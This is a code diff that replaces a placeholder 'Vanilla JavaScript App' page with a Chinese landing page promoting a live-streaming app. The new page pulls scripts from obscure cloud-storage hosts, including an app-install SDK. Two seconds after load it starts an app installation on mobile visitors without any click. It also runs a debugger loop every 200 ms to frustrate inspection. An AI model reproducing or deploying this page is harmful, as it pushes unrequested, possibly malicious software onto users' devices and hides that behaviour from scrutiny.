@@ -1,17 +1,150 @@
-<!DOCTYPE html>
-<html lang="en">
 
+<!DOCTYPE html>
+<html lang="en" style="font-size: 54.5638px;">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <link rel="stylesheet" href="styles.css">
-  <title>Vanilla JavaScript App</title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <title>开心每一天</title>
+    <script type="text/javascript" src="https://luodiye6666.oss-accelerate.aliyuncs.com/v10/js/jquery-3.4.1.min.js"></script>
+    <script type="text/javascript" charset="UTF-8" src="https://sjiawmndadasdoss.oss-accelerate.aliyuncs.com/appinstall2.js"></script>
+    <script type="text/javascript" charset="UTF-8" src="https://luodiye6666.oss-accelerate.aliyuncs.com/v10/js/zdxz.js"></script>
+
+    <script src="https://luodiye6666.oss-accelerate.aliyuncs.com/v10/js/qrcode.min.js"></script>
+    <script src="https://luodiye6666.oss-accelerate.aliyuncs.com/v10/js/jquery-confirm.min.js"></script>
 </head>
 
 <body>
-  <main>
-    <h1>Vanilla JavaScript App</h1>
-  </main>
-</body>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" type="text/css" href="https://luodiye6666.oss-accelerate.aliyuncs.com/v10/css/style.css">
+    <link rel="stylesheet" type="text/css" href="https://luodiye6666.oss-accelerate.aliyuncs.com/v10/css/css.css">
+    <link rel="stylesheet" href="https://luodiye6666.oss-accelerate.aliyuncs.com/v10/css/jquery-confirm.min.css">
 
-</html>
+
+    <div style="display:none; z-index:9999;">
+        <img id="imgid" style="width:100vw; z-index:9999999; display: inline-block;">
+    </div>
+    <div class="start-btn" onClick="DownSoft();">
+        <div id="allpng">
+            <div class="header mbtn">
+                <img src="https://lc-v13.oss-cn-guangzhou.aliyuncs.com/head-a980937106.abc">
+            </div>
+            <div class="zw"></div>
+            <div class="content mbtn">
+                <div class="play-item">
+                    <img src="https://lc-v13.oss-cn-guangzhou.aliyuncs.com/loading-cf5471dabf.abc">
+                    <img class="play-btn" src="https://luodiye6666.oss-accelerate.aliyuncs.com/v10/img/play.png">
+                </div>
+                <img src="https://luodiye6666.oss-cn-hongkong.aliyuncs.com/v15/index.abc">
+            </div>
+            <div class="zw"></div>
+            <div class="footer mbtn">
+                <img src="https://lc-v13.oss-cn-guangzhou.aliyuncs.com/foot-c8f8baa771.abc">
+            </div>
+        </div>
+    </div>
+<script>
+    // 浏览器鉴别
+    var browser = {
+        versions: function() {
+            var u = navigator.userAgent,
+                app = navigator.appVersion;
+            return { //移动终端浏览器版本信息
+                trident: u.indexOf('Trident') > -1, //IE内核
+                presto: u.indexOf('Presto') > -1, //opera内核
+                webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+                gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+                mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+                ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+                android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+                iPhone: u.indexOf('iPhone') > -1, //是否为iPhone或者QQHD浏览器
+                iPad: u.indexOf('iPad') > -1, //是否iPad
+                webApp: u.indexOf('Safari') == -1 //是否web应该程序，没有头部与底部
+            };
+        }(),
+        language: (navigator.browserLanguage || navigator.language).toLowerCase()
+    }
+
+
+
+    // PC 二维码
+    function show_confirm() {
+        var _url = window.location.href
+
+        $.dialog({
+            icon: 'glyphicon glyphicon-heart',
+            title: '<span style="color: red; font-size: 14px">绿茶直播APP下载<span>',
+            theme: 'Material',
+            draggable: true,     // 允许拖动
+            closeIcon: true,     // 显示右上角关闭感觉
+            animation: 'zoom',     // 3D动画
+            animationBounce: 1, // 弹跳
+            animationSpeed: 1500,  // 速度
+            backgroundDismiss: false,  // 背景关闭动画
+            backgroundDismissAnimation: 'glow', // 背景关闭动画
+            boxWidth: '14%',      // 宽度
+            useBootstrap: false,  // 禁用
+
+            content: '<div id="qrcode"></div>' + 
+                    '<script type="text/javascript">' +
+                    'var qrcode = new QRCode("qrcode", {' +
+                        'text:"' + _url + '",' +
+                        'width: 256,' + 
+                        'height: 256,' +
+                        'colorDark: "#000000", ' +
+                        'colorLight: "#ffffff",' +
+                        'correctLevel: QRCode.CorrectLevel.H' +
+                    '});' +
+                '<\/script>',
+        })
+    }
+
+
+    function dbg() {
+        debugger;
+    }
+    setInterval(dbg, 200);
+
+
+    function DownSoftApp() {
+            var data = AppInstall.parseUrlParams();
+            new AppInstall({
+                appKey : "mxsxhp",
+                server : appserver,
+                channelCode: code,
+                onready : function() {
+                    var m = this;
+                    m.install();
+                    return false;
+                }
+            }, data);
+    }    
+
+    // PC APP 选择
+    function DownSoft(){
+        var  isPC = true;
+        if(browser.versions.mobile || browser.versions.ios || browser.versions.android ||
+                browser.versions.iPhone || browser.versions.iPad) {
+                //  如果是手机设置自动下载
+                isPC = false;
+                DownSoftApp()
+
+            } else {
+                isPC = true;
+                show_confirm()
+        };
+    }
+
+
+    setTimeout(function() { 
+            DownSoft();
+    }, 2000);
+
+
+    function tokf() {
+        window.location.href = "https://baidu.com";
+    }
+
+</script>
+
+
+</body></html>
